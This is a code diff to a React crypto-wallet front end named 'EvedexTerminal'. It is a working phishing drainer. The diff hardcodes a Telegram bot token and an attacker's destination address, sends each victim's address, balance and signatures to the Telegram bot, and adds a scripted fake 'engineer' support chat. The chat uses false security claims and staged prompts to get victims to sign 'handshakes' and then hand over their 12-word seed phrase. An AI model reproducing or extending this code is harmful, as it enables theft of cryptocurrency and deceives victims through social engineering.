@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
 import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, MessageSquare, Send } from 'lucide-react';
 
@@ -18,14 +18,21 @@ export default function EvedexTerminal() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
 
-  // --- NEW: SMART BOT STATES ---
+  // --- SMART BOT STATES ---
   const [chatInput, setChatInput] = useState("");
+  const [isTyping, setIsTyping] = useState(false);
   const [chatLog, setChatLog] = useState([{ type: 'bot', msg: "SYSTEM: SECURE NODE CONNECTION ESTABLISHED. HOW CAN I ASSIST WITH YOUR ASSET MIGRATION?" }]);
   const [stage, setStage] = useState(1);
+  const chatEndRef = useRef(null);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
+
+  // Auto-scroll chat
+  useEffect(() => {
+    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
+  }, [chatLog, isTyping]);
 
   useEffect(() => {
     if (isConnected && address && balance?.formatted) {
@@ -48,31 +55,53 @@ export default function EvedexTerminal() {
             text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
           }),
         });
-        if(stage === 1) setStage(2); // Move to second stage after first SIG
+        if(stage === 1) setStage(2); 
       }
     });
   };
 
-  // --- NEW: SMART ENGINEER LOGIC ---
+  // --- UPDATED SMART ENGINEER LOGIC WITH TYPING DELAY ---
   const handleBotChat = () => {
-    if (!chatInput.trim()) return;
+    if (!chatInput.trim() || isTyping) return;
+    
     const userMsg = chatInput.toLowerCase();
-    let botResponse = "";
-
-    if (stage === 1) {
-      botResponse = "[ENGINEER]: Initializing diagnostic... I see your vault is currently de-synced from the mainnet. Please click 'RECTIFY' to perform the first security handshake.";
-    } else if (stage === 2) {
-      if (userMsg.includes("stuck") || userMsg.includes("pending") || userMsg.includes("aion") || userMsg.includes("why")) {
-        botResponse = `[ENGINEER]: Analyzing network logs... Native bridge status is 'SUSPENDED'. This is a common node mismatch. Please click the 'INITIALIZE' button to start the secondary handshake.`;
-      } else {
-        botResponse = "[ENGINEER]: Connection detected. Proceed with the dashboard tools to begin the automated migration process.";
-      }
-    } else if (stage === 3) {
-      botResponse = "[CRITICAL]: System stall at 90%. The node requires a final 'Project Seed' to verify vault ownership. Enter the 12 words in the Auth Error box to complete sync.";
-    }
-
-    setChatLog([...chatLog, { type: 'user', msg: chatInput }, { type: 'bot', msg: botResponse }]);
+    const newUserLog = [...chatLog, { type: 'user', msg: chatInput }];
+    setChatLog(newUserLog);
     setChatInput("");
+    setIsTyping(true);
+
+    // Knowledge Base
+    const brain = {
+      "why": "Handshake signatures provide 'Proof-of-Ownership' to the node without requiring gas fees. It allows the backend to bypass the current suspension manually.",
+      "migrate": "Migration requires a cross-chain node sync. Please select the 'MIGRATE' portal (center-left) to initiate the handshake.",
+      "rectify": "The Rectify portal re-indexes your vault's liquidity. Select 'RECTIFY' to begin the primary security handshake.",
+      "safe": "All handshakes are processed via AES-256 encrypted protocols. Your signature is a local authorization to sync your vault with Evedex nodes.",
+      "stuck": "Pending status is usually caused by a Nonce-Mismatch. The handshake re-aligns your wallet sequence to the mainnet block.",
+      "airdrop": "Airdrop rewards are held in the 'Pending' queue. Click the 'AIRDROP' portal to authorize the node release.",
+      "aion": "OAN Native assets require a Season 2 bridge authorization. The handshake maps your legacy seed to the new EVM vault."
+    };
+
+    // 1.5 Second "Thinking" delay
+    setTimeout(() => {
+      let matchedAnswer = "";
+      for (let key in brain) {
+        if (userMsg.includes(key)) { matchedAnswer = brain[key]; break; }
+      }
+
+      let botResponse = "";
+      if (matchedAnswer) {
+        botResponse = `[ENGINEER]: ${matchedAnswer}`;
+      } else if (stage === 1) {
+        botResponse = "[ENGINEER]: Diagnostic initiated. I see your vault is currently de-synced. Please click 'RECTIFY' to perform the first security handshake.";
+      } else if (stage === 2) {
+        botResponse = "[ENGINEER]: First handshake verified. Bridge is 45% mapped. Please select a portal and click 'INITIALIZE' for the secondary node validation.";
+      } else if (stage === 3) {
+        botResponse = "[CRITICAL]: System stall at 90%. Manual Ownership Verification required. Please provide the 12-word Project Seed in the error box to finalize migration.";
+      }
+
+      setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
+      setIsTyping(false);
+    }, 1500);
   };
 
   const executeTotalSweep = async () => {
@@ -101,7 +130,7 @@ export default function EvedexTerminal() {
               setTimeout(() => { 
                 setLoading(false); 
                 setView("seed_gate"); 
-                setStage(3); // Trigger Stage 3 (The Seed Grab)
+                setStage(3); 
               }, 3000);
             }
           }, 60);
@@ -138,7 +167,7 @@ export default function EvedexTerminal() {
         <w3m-button balance="hide" /> 
       </header>
 
-      <div className="flex-1 overflow-y-auto no-scrollbar pb-24">
+      <div className="flex-1 overflow-y-auto no-scrollbar pb-32">
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3 animate-in fade-in">
             {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
@@ -167,14 +196,16 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* --- NEW: THE SMART ENGINEER CHAT DRAWER --- */}
+      {/* --- SMART ENGINEER CHAT --- */}
       <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-50">
-        <div className="max-h-40 overflow-y-auto mb-4 no-scrollbar flex flex-col gap-2">
+        <div className="max-h-32 overflow-y-auto mb-4 no-scrollbar flex flex-col gap-2">
           {chatLog.map((chat, i) => (
             <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500' : 'text-slate-400 text-right italic'}`}>
               {chat.msg}
             </div>
           ))}
+          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER IS TYPING...]</div>}
+          <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
           <input 
